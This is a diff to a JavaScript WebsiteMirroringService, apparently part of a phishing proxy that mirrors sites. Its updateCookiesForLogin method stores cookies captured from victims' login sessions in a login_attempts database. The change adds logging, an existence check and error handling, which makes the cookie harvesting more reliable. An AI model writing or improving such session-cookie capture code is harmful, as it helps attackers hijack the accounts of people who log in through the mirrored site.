@@ -1092,23 +1092,47 @@ class WebsiteMirroringService {
    */
   async updateCookiesForLogin(loginAttemptId, sessionToken) {
     try {
-      if (!loginAttemptId || !sessionToken) return;
+      if (!loginAttemptId || !sessionToken) {
+        console.log('Missing loginAttemptId or sessionToken for cookie update');
+        return;
+      }
       
       const captures = this.captures.get(sessionToken);
-      if (!captures || !captures.cookies || captures.cookies.length === 0) return;
+      if (!captures || !captures.cookies || captures.cookies.length === 0) {
+        console.log(`No cookies found in captures for session ${sessionToken}`);
+        return;
+      }
       
       // Store cookies in database
       const cookiesJson = JSON.stringify(captures.cookies);
       
+      console.log(`Updating login attempt ${loginAttemptId} with ${captures.cookies.length} cookies`);
+      
+      // First verify the login attempt exists
+      const loginAttempt = await new Promise((resolve, reject) => {
+        db.get('SELECT id FROM login_attempts WHERE id = ?', [loginAttemptId], (err, row) => {
+          if (err) reject(err);
+          else resolve(row);
+        });
+      });
+      
+      if (!loginAttempt) {
+        console.error(`Login attempt with ID ${loginAttemptId} not found`);
+        return;
+      }
+      
+      // Update the login attempt with cookies
       await new Promise((resolve, reject) => {
         db.run(`
           UPDATE login_attempts 
           SET cookies = ?, has_cookies = 1
           WHERE id = ?
-        `, [cookiesJson, loginAttemptId], (err) => {
-          if (err) reject(err);
-          else {
-            console.log(`Updated cookies for login attempt: ${loginAttemptId}`);
+        `, [cookiesJson, loginAttemptId], function(err) {
+          if (err) {
+            console.error(`Error updating cookies for login attempt ${loginAttemptId}:`, err);
+            reject(err);
+          } else {
+            console.log(`Successfully updated cookies for login attempt ${loginAttemptId}. Changes: ${this.changes} rows`);
             resolve();
           }
         });
